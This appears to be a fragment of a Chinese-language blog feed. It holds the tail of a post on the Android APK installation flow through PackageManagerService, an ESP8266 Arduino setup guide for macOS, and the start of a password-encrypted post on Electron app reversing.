mInstaller，最后基于不同的命令调用不同的方法。</p><p>runInstall() 里面会首先获取之前解析时设置的安装参数 InstallParams，然后依次调用 doCreateSession() 创建安装会话，doWriteSession() 会通过 IO 流将应用信息写入 PackageInstaller.Session 对象，doCommitSession() 会提交相应的会话启动安装，最后调用 abandonSession() 结束会话。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152518924.png?raw=true" alt="image-20190801152518924"></p><p>PackageInstallerSession 的 commit() 方法首先将包信息封装到 PackageInstallObserverAdapter 这个类中，是 PackageInstallerService 的一个内部类，然后通过这个适配器获取 PackageInstallObserver2 对象代理，这是一个跨进程的观察者，接收安装状态的回调，最后用 Handler 的 obtainMessage 构造一个 MSG_COMMIT 类型的消息并发送出去。</p><p>发送的消息由 PackageInstallerService 的 Handler.Callback 接受，然后调用 commitLocked()，此方法最终会调用 PMS 的 installStage() 方法。</p><p>PackageInstallObserver2 对象接收到安装成功的回调时，会接着调用 PackageInstallerService 的 dispatchSessionFinished()，这个方法最后也是到了 PMS 里面调用 sendSessionCommitBroadcast() 方法。</p><h4 id="场景三：第三方应用安装"><a href="#场景三：第三方应用安装" class="headerlink" title="场景三：第三方应用安装"></a>场景三：第三方应用安装</h4><p>当下载一个新的应用包双击安装时，实际上是发送了一个 “android.intent.action.INSTALL_PACKAGE” 的 intent，这个时候会唤起 Android 系统的一个应用 PackageInstaller 来完成安装操作</p><p>PackageInstaller 的应用代码位于：<a href="http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/packages/apps/PackageInstaller/</a></p><p>安装位置 /system/priv-app/GooglePackageInstaller，是一个 Android 系统默认应用程序，提供了用户界面来管理应用或包，用于安装普通文件</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152605993.png?raw=true" alt="image-20190801152605993"></p><p>应用双击安装后会唤起 PackageInstaller 应用，入口类为 InstallStart，onCreate() 首先被调用完成一些初始化过程，然后获取调用源做一些权限检查。</p><p>然后会调起 PackageInstallerActivity，onCreate() 会包括获取 PackageManager 和 PackageInstaller 对象，然后从 intent 中获取 mSessionId、packageUri、mOriginatingURI、mReferrerURI 这些与安装包相关的信息，接着调用 processPackageUri() 解析 uri，这里面会调用 PackageParser 去解析包，再接着会调用 bindUi() 完成安装主界面的展示和部件绑定，最后调用 checkIfAllowedAndInitiateInstall() 检查是否允许安装，如果允许，里面会继续调用 initiateInstall() 初始化安装，实际上这个函数是检查是否需要替换安装，最后调用 startInstallConfirm() 准备安装，设置 mOk 这个安装按钮为 true。</p><p>用户确认点击安装按钮后，调用 startInstall() 开始安装，这个函数里面又会构造一个 intent 传递必要的数据，开启 InstallInstalling 这个 activity。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152635344.png?raw=true" alt="image-20190801152635344"></p><p>InstallInstalling 这个类会拿到应用数据开启真正的安装流程。</p><p>首先是 onCreate() 函数，首先从 Intent 中取出数据放到 ApplicationInfo 中，然后基于拿到的应用信息分两种情况：如果是更新，则调用 getPackageManager() 获取 PackageManager 然后调用 installExistingPackage() 安装，成功调用 launchSuccess() 方法，失败调用 launchFailure() 方法，launchSuccess 会构造 Intent 跳转到 InstallSuccess 类， launchFailure 则跳转到 InstallFailed 类；如果是新应用的安装，首先会向 InstallEventReceiver 注册一个安装结果监听的广播，成功调用 launchSuccess，失败调用 launchFailure。</p><p>接下来是 onStart() 方法，这里会依次调用 getPackageManager()，getPackageInstaller()，registerSessionCallback() 注册会话的回调。</p><p>最后是 onResume() 方法，这个方法里会获取 session 的相关信息，然后创建并执行 InstallingAsyncTask() 的安装服务，其中的 doInBackground() 方法会将应用信息通过 IO 流写入 PackageInstaller.Session 中，onPostExecute() 方法则构造一个 PendingIntent 并将它的 IntentSender 通过 PackageInstaller.Session 的 commit() 方法发送出去</p><p>这里就跟 adb 安装走到了同一个流程中。</p><h4 id="深入-PMS-中的安装"><a href="#深入-PMS-中的安装" class="headerlink" title="深入 PMS 中的安装"></a>深入 PMS 中的安装</h4><p>上面的后面两种场景最后都会通过 PackageInstallerSession 的 commit() 方法提交一个安装的会话，并且最终调用到了 PackageManagerService 的 installStage() 方法</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152711796.png?raw=true" alt="image-20190801152711796"></p><p>在 installStage() 里会基于传入的参数构造一个 InstallParams 对象，这个对象中包含安装包的所有数据，然后将这个对象作为消息内容，通过 mHandler 发送一个类型为 INIT_COPY 的消息。</p><p>所有类型的消息处理都在 PackageHandler 里，这个类会通过 Binder 与 system_server 创建的 ServiceThread 线程绑定，PackageHandler 负责分发任务，ServiceThread 负责处理任务。</p><p><strong>1、处理 INIT_COPY 消息</strong></p><p>首先从消息结构中取出前面封装好的 HandlerParams 对象，然后检查 mBound 标志判断是否绑定 DefaultContainerService，这个服务用于检查和复制文件，位于 com.android.defcontainer 进程，通过 IMediaContainerService 与PMS 通信，mBound 默认为 false，此时调用 connectToService() 来绑定服务，并获取当前索引值的 HandlerParams 对象添加到 mPendingInstalls 这个 HandlerParams 的 ArrayList 中，如果 mBound 为 true，即服务已经连接，则直接添加 HandlerParams 对象，并发送一个 MCS_BOUND 消息。</p><p><strong>2、处理 MCS_BOUND 消息</strong></p><p>首先检查 DefaultContainerService 服务连接没问题，就开始处理安装请求队列，从 mPendingInstalls 中取出 HandlerParams 对象并调用它的 startCopy() 方法。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152741833.png?raw=true" alt="image-20190801152741833"></p><p>HandlerParams 是 PMS 中的抽象类，它的 startCopy() 会通过一个 mRetries 的私有变量检查尝试次数，超过4次则向 Handler 发送 MCS_GIVE_UP 的消息，抓到异常则发送 MCS_RECONNECT 的消息，成功则继续调用 handleStartCopy() 这个抽象方法，具体实现在 InstallParams 中，</p><p>InstallParams 的 handleStartCopy() 会首先是确定应用安装位置，是sd卡还是内部存储，并且做一些检查如位置冲突，空间够不够，然后通过 createInstallArgs() 创建 InstallArgs 类，然后调用这个类的 copyApk() 方法，InstallArgs 类也是抽象类，定义了应用包安装逻辑，子类包括 FileInstallArgs，处理 non-ASEC 应用，也即内部存储空间的应用， AsecInstallArgs 处理安装到 SD 卡中的应用，以及 MoveInstallArgs 处理已安装的应用，因此实际上是调用各自实例对象的 copyApk() 方法</p><p>以 FileInstallArgs 为例，copyApk() 方法会调用 doCopyApk()，在这个方法里会首先创建一个临时存储目录，然后调用 DefaultContainerService 的 copyPackage() 方法完成 apk 复制</p><p>HandlerParams 复制 apk 后会调用 handleReturnCode()，这个方法又会调用 processPendingInstall() 方法，最终会调用到 InstallArgs 的 doPreInstall() 完成安装前的清理工作，调用 installPackageTracedLI() 实现真正的安装，以及调用 InstallArgs 的 doPostInstall() 完成收尾的清理工作，最后发送一个类型为 POST_INSTALL 的消息</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152755489.png?raw=true" alt="image-20190801152755489"></p><p> installPackageTracedLI() 里面完成的是真正的安装操作，会依次进行变量初始化，再次解析应用包，获取签名信息，权限检查，安装路径重命名等等操作，最后根据参数有两种不同的处理方式，更新条件下的覆盖安装，调用 replacePackageLI() 方法，以及应用的首次安装，调用 installNewPackageLI() 方法</p><p>其中 replacePackageLI() 会首先清楚应用包的注册信息，然后类似 installNewPackageLI() 里面的流程重新安装更新的包，直接看  installNewPackageLI() 流程</p><p>installNewPackageLI() 里面调用 scanPackageTraceLI() 执行安装，然后这个函数里面又会继续调用 scanPackageInternalLI() 执行包解析，最后将 PackageParser.Package 对象返回出来，扫描完包之后就会调用 updateSettingsLI() 更新 Settings，也就是更新应用在 PMS 中的注册信息，会修改包括 packages.xml、package.list 等相关文件，如果安装成功则调用 prepareAppDataAfterInstallLIF() 来创建相关的数据目录，失败则执行回退操作 deletePackageLIF()</p><p><strong>3、处理 POST_INSTALL 消息</strong></p><p>首先从 mRunningInstalls 中拿到 PostInstallData 对象，mRunningInstalls 是 PostInstallData 格式的列表，在应用安装成功时构建，在安装完成后会调用 delete() 移除这一条记录，接下来取 PostInstallData 对象中的一些信息如安装参数，授予的权限等作为参数调用 handlePackagePostInstall() 执行安装完成的后续操作，包括授予权限，发送安装成功广播，发送启动广播等等</p><h4 id="安装过程小结"><a href="#安装过程小结" class="headerlink" title="安装过程小结"></a>安装过程小结</h4><p>与应用相关的一些目录</p><ul><li><p>/system/priv-app：系统应用安装路径，Android 4.4+ 开始出现，区分系统应用权限，拥有 SignatureOrSystem 权限，此目录下的 service 具有保活能力</p></li><li><p>/system/app：系统应用安装路径，权限略低于 priv-app 目录下的应用，放置比如厂商内置应用</p></li><li><p>/data/app：用户应用安装路径，应用安装时将 apk 复制到此目录下</p></li></ul><ul><li><p>/data/data：用户应用数据存放路径，存在沙箱隔离</p></li><li><p>/data/dalvik-cache：存放应用的dex 文件</p></li><li><p>/data/system：存放应用安装相关文件</p><ul><li>packages.xml 是一个应用的注册表，在解析应用时创建，有变化时更新，记录系统权限，各应用信息，如name, codePath, flag, version, userid，下次开机时直接读取并添加到内存列表</li><li>package.list 指定应用的默认存储位置，userid 等</li></ul></li></ul><p>应用安装过程总结</p><ol><li>将应用 apk 拷贝到指定目录下</li><li>解压 apk，将 dex 文件拷贝到 /data/dalvik-cache 目录，创建 /data/data/<packagename> 数据目录</packagename></li><li>解析 AndroidManifest.xml 及其他资源文件，提取应用包信息，注册到 packags.xml 中</li><li>由 Launcher 进程通过 PMS 取出所有应用程序，展示在桌面上</li></ol><h4 id="PMS-与-PM-与APM"><a href="#PMS-与-PM-与APM" class="headerlink" title="PMS 与 PM 与APM"></a>PMS 与 PM 与APM</h4><p>前面的一切分析都是围绕 PackageManagerService 来进行的，但是实际上平时开发过程中基本接触不到这个类，在用户层用得最多的应该是 PackageManager 这个类</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152858658.png?raw=true" alt="image-20190801152858658"></p><p>通常在用户层通过 Context 的 getPackageManager() 方法来获取 PackageManager 实例，Context 的 getPackageManager() 实现在 ContextImpl 里面，这个函数实际上返回的是一个 ApplicationPackageManager 对象，ApplicationPackageManager 类构造函数需要两个璨是，一个是 ContextImpl 自身，另一个是通过 ActivityThread 的 getPackageManager() 获取 IPackageManager 对象</p><p>ActivityThread 的 getPackageManager() 首先调用 ServiceManager 的 getService(“package”) 获取 IBinder 对象，然后通过 IPackageManger.Stub.asInterface(IBinder) 获取 IPackageManager 对象，实际上为这个对象的一个代理</p><p>继续梳理一下这个类与 PMS 之间的关系</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/android-apk-install-process/image-20190801152915992.png?raw=true" alt="image-20190801152915992"></p><p>IPackageManager 使用了 Android 接口定义语言（AIDL）实现进程间通信，通过在 .aidl 后缀的文件中定义好接口，Android SDK 就会基于此文件自动生成一个 IBinder 接口的类，服务端实现这些接口，客户端则通过绑定到服务调用接口中定义的方法</p><p>IPackageManager 通过 AIDL 文件自动生成的一个接口类，继承自 IInterface</p><p>IPackageManager.Stub 是 IPackageManager 的内部类，继承自 Binder，实现 IPackageManager</p><ul><li>asInterface() 方法接受 IBinder 对象，转换成 IPackageManager 类型对象并返回，实际上返回的是 IPackageManager.Stub.Proxy 对象</li><li>asBinder() 方法返回自身，即 IPackageManager.Stub 对象</li><li>重写了 onTransact() 方法，根据命令类型处理数据传输</li></ul><p>IPackageManager.Stub.Proxy 是 IPackageManager.Stub 的内部类，实现了IPackageManager接口</p><ul><li>mRemote对象是IBinder类型，是对IPackageManager.Stub的引用</li><li>重写了asBinder()方法，返回mRemote</li><li>实现了AIDL文件定义的接口</li></ul><p>PackageManager 是系统提供的服务管理类，负责管理应用程序包的，包含以下功能：</p><ul><li>安装/卸载/更新应用，包括 installPackage/</li><li>查询已安装应用，通过 getInstalledPackages() 方法获取 PackageInfo 对象的列表</li><li>查询应用相关信息，通过 getPackageInfo() 方法获取 PackageInfo 对象</li><li>查询权限相关信息，通过 getPermissionInfo() 方法获取 PermissionInfo 对象</li><li>增加/删除权限，包括 addPermission/removePermission</li><li>清除用户数据/缓存/代码等</li></ul><p>PackageManager 是一个抽象类，定义了 IPackageManager 接口的子集</p><p>ApplicationPackageManager 是 PackageManager 的实现类，它继承了 PackageManager 并实现其所有抽象方法</p><p>PackageManagerService 继承了 IPackageManager.Stub</p><p>因此，总结来说就是，ApplicationPackageManager 是 AIDL 模型中 Binder 通信的客户端，PackageMangerService 就是服务端，客户端的所有的功能都是通过一个 IPackageManager 类型的成员变量去完成的，实际上这个变量就是 PackageManagerService 的一个代理，通过这个代理客户端可以调用到 PackageManagerService 中的一些方法</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="http://androidxref.com/8.1.0_r33/xref/" target="_blank" rel="external">http://androidxref.com/8.1.0_r33/xref/</a></li><li><a href="https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6" target="_blank" rel="external">https://juejin.im/post/5b7e72bbe51d453894001ef0#heading-6</a></li><li><a href="http://solart.cc/2016/10/30/install_apk/" target="_blank" rel="external">http://solart.cc/2016/10/30/install_apk/</a></li><li><a href="https://www.jianshu.com/p/4f16421d5c7f" target="_blank" rel="external">https://www.jianshu.com/p/4f16421d5c7f</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Android应用安装过程深度解析&quot;&gt;&lt;a href=&quot;#Android应用安装过程深度解析&quot; class=&quot;headerlink&quot; title=&quot;Android应用安装过程深度解析&quot;&gt;&lt;/a&gt;Android应用安装过程深度解析&lt;/h3&gt;&lt;blockquote&gt;

      
    
    </summary>
    
      <category term="wiki" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/wiki/"/>
    
    
      <category term="RE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/RE/"/>
    
      <category term="Android" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Arduino ESP8266开发板上手实践</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/30/Arduino-ESP8266-bigstep/Arduino-ESP8266-bigstep/</id>
    <published>2019-07-30T02:46:35.000Z</published>
    <updated>2019-08-09T08:47:21.452Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Arduino-ESP8266开发板上手实践"><a href="#Arduino-ESP8266开发板上手实践" class="headerlink" title="Arduino ESP8266开发板上手实践"></a>Arduino ESP8266开发板上手实践</h3><h4 id="环境搭建（macOS）"><a href="#环境搭建（macOS）" class="headerlink" title="环境搭建（macOS）"></a>环境搭建（macOS）</h4><p>官方说明：<a href="https://github.com/esp8266/Arduino">https://github.com/esp8266/Arduino</a></p><ul><li><p><strong>安装IDE （Arduino IDE）</strong></p><p>下载地址：<a href="https://www.arduino.cc/en/main/software" target="_blank" rel="external">https://www.arduino.cc/en/main/software</a></p><p>还有种方式是利用<a href="https://github.com/plerup/makeEspArduino">Makefile</a>去做开发，这里先做个记录，说不定以后会用这个开发模式，毕竟可控性比较高。但目前还不是很熟悉，建议选择上面的IDE。</p></li></ul><ul><li><p><strong>下载ESP8266硬件包</strong></p><p>1 、在设置里面的附加板管理器网址中增加以下链接<code>https://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143145367.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、在工具中找到你的开发板，然后进入开发板管理器，搜索<strong>esp8266</strong>安装该库，我这里已经安装了。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730143643887.png?raw=true" width="500" hegiht="313" align="center"></p><p>注意：如果这种方式安装不了，你可以选择下载软件包手动安装，这里不展开分析。参考<a href="https://github.com/esp8266/Arduino">这里</a></p></li><li><p><strong>运行示例代码</strong></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730144157955.png?raw=true" width="500" hegiht="313" align="center"></p><p>我这里打开Blink这个示例代码，这段代码很简单，就是控制LED灯的闪烁。</p><p>代码如下</p><pre><code class="c">/*  ESP8266 Blink by Simon Peter  Blink the blue LED on the ESP-01 module  This example code is in the public domain  The blue LED on the ESP-01 module is connected to GPIO1  (which is also the TXD pin; so we cannot use Serial.print() at the same time)  Note that this sketch uses LED_BUILTIN to find the pin with the internal LED*/void setup() {  pinMode(LED_BUILTIN, OUTPUT);     // Initialize the LED_BUILTIN pin as an output}// the loop function runs over and over again forevervoid loop() {  digitalWrite(LED_BUILTIN, LOW);   // Turn the LED on (Note that LOW is the voltage level  // but actually the LED is on; this is because  // it is active low on the ESP-01)  delay(1000);                      // Wait for a second  digitalWrite(LED_BUILTIN, HIGH);  // Turn the LED off by making the voltage HIGH  delay(2000);                      // Wait for two seconds (to demonstrate the active low LED)}</code></pre><p>在这里点击项目上传，就会编译该Blink项目并上传写入开发板上面运行。如果一切顺利的话，你的开发板的LED灯应该就会开始闪烁了。</p></li></ul><h4 id="重要！！！一些坑以及注意点"><a href="#重要！！！一些坑以及注意点" class="headerlink" title="重要！！！一些坑以及注意点"></a>重要！！！一些坑以及注意点</h4><p>下面说下一切不是很顺利的情况，首先我这里是以mac会开发平台，所以这里都是mac相关的注意事项和问题。</p><p>确定你的端口正常，即电脑是否与开发板正常通信。一般来说你上传代码报错多半是由于端口不可用或者无法找到端口。这里提供几个思路去检查。</p><p>1、确定usb是否连接，这里可以下载一个IORegistryExplorer的工具。<a href="https://developer.apple.com/download/more/" target="_blank" rel="external">下载地址1</a> <a href="https://github.com/vulgo/IORegistryExplorer">下载地址2</a> <a href="https://mac.softpedia.com/get/System-Utilities/IORegistryExplorer.shtml" target="_blank" rel="external">下载地址3</a>在我插入开发板的时候可以看到usb2.0下面多了一个设备，说明能够usb连接正常。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145128956.png?raw=true" width="500" hegiht="313" align="center"></p><p>2、确定安装了开发板相关的驱动，这个驱动的作用主要就是将设备操作通过<code>Virtual COM Port</code>去通信。这里有几个坑。之前网上能搜到的驱动都不支持最新的macOS系统（10.14）。所以导致我的<code>/dev</code>目录下并没有出现对应的文件。之前的驱动大多是这个<a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">CH340G CH34G CH34X Mac OS X driver</a> 照着里面的步骤，把SIP禁用以及其他都操作了一遍都不行。最后才发现这个驱动可能不支持最新的mac系统，这里我找到一个能够在最新系统正常的驱动下载地址在<a href="https://www.silabs.com/products/development-tools/software/usb-to-uart-bridge-vcp-drivers" target="_blank" rel="external">这里</a>。安装完以后在<code>/dev</code>就应该有一个<code>tty.SLAB_USBtoUART</code>的文件。说明通信的端口已经建立，这时候再IDE中选择该端口。</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/Arduino-ESP8266-bigstep/image-20190730145909934.png?raw=true" width="500" hegiht="313" align="center"></p><h4 id="资源链接"><a href="#资源链接" class="headerlink" title="资源链接"></a>资源链接</h4><p>这里我提供一些我在搭建过程中搜到的一些资源，可以参考一下</p><ul><li><p><a href="https://www.arduino.cc/en/guide/macOSX?setlang=cn" target="_blank" rel="external">https://www.arduino.cc/en/guide/macOSX?setlang=cn</a></p><p>在Mac OS X系统上入门Arduino/ Genuino</p></li><li><p><a href="https://juejin.im/post/5b569026e51d4513ee6dd509" target="_blank" rel="external">https://juejin.im/post/5b569026e51d4513ee6dd509</a></p><p>Esp8266+Arduino+Mac开发环境搭建</p></li><li><p><a href="https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/" target="_blank" rel="external">https://www.open-homeautomation.com/2016/06/10/program-an-esp8266-from-arduino-on-macos/</a></p><p>Program an ESP8266 from Arduino on MacOS</p></li><li><p><a href="https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver">https://github.com/adrianmihalko/ch340g-ch34g-ch34x-mac-os-x-driver</a></p><p>CH340G CH34G CH34X Mac OS X driver</p></li><li><p><a href="http://www.nodemcu.com" target="_blank" rel="external">http://www.nodemcu.com</a></p><p>资料下载访问官网</p></li><li><p><a href="https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg" target="_blank" rel="external">https://pan.baidu.com/s/1ZCjaSJLNpQWL7CPOpkH-dg</a></p><p>NODEMCU资料</p></li><li><p><a href="http://www.wch.cn/download/CH341SER_MAC_ZIP.html" target="_blank" rel="external">http://www.wch.cn/download/CH341SER_MAC_ZIP.html</a></p><p>mac串口驱动下载地址</p></li><li><p><a href="https://freeware.the-meiers.org/" target="_blank" rel="external">https://freeware.the-meiers.org/</a></p><p>CoolTerm串口监控工具下载</p></li><li><p>SIP禁用步骤</p><pre><code>1. 重启mac，在出现苹果标志和进度条的时候按住 cmd+r2. 终端中输入csrutil disable/status/enabled3. 重启mac</code></pre></li></ul><h4 id="AVR逆向基础"><a href="#AVR逆向基础" class="headerlink" title="AVR逆向基础"></a>AVR逆向基础</h4><p>下面我们就来熟悉一下这个系统，包括代码环境，编译环境，常见库，开发相关。还是以一些demo代码作为学习。</p><p>由于我们主要是研究iOT逆向，所以可能不会关注在实际开发上面。这里先学习下Arduino上面的执行文件格式，以及指令架构等。</p><p>我们通常说的Arduino上面就运行的是一个AVR指令架构的处理器。</p><blockquote><p>AVR refers to the line of MCUs manufactured by Atmel and used in the original designs.</p></blockquote><p>由于ida对这个执行文件的支持不是很好，我们准备用<a href="https://github.com/radare/radare2">radare2</a>来分析这个bin文件。</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><p><a href="https://blog.csdn.net/iotisan/article/details/78766463" target="_blank" rel="external">https://blog.csdn.net/iotisan/article/details/78766463</a></p><p>和ESP8266 Arduino谈场恋爱 01 一条具有中国特色的开发环境安装道路</p></li><li><p><a href="https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/" target="_blank" rel="external">https://www.reddit.com/r/arduino/comments/9jlz5g/any_nodemcu_esp8266_drivers_for_macos_mojave/</a></p><p>Any NodeMCU esp8266 Drivers for MacOS Mojave?</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Arduino-ESP8266开发板上手实践&quot;&gt;&lt;a href=&quot;#Arduino-ESP8266开发板上手实践&quot; class=&quot;headerlink&quot; title=&quot;Arduino ESP8266开发板上手实践&quot;&gt;&lt;/a&gt;Arduino ESP8266开发板上手
      
    
    </summary>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/IOT/"/>
    
    
      <category term="Arduino" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Arduino/"/>
    
      <category term="IOT" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/IOT/"/>
    
  </entry>
  
  <entry>
    <title>Electron跨平台App实战分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2019/07/29/Electron-app-reversing/Electron-app-reversing/</id>
    <published>2019-07-29T03:59:49.000Z</published>
    <updated>2019-07-29T14:45:34.468Z</updated>
    
    <content type="html"><![CDATA[<script src="//cdn.bootcss.com/jquery/1.11.3/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Need password to decrypt!">    <label for="pass">Need password to decrypt!</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">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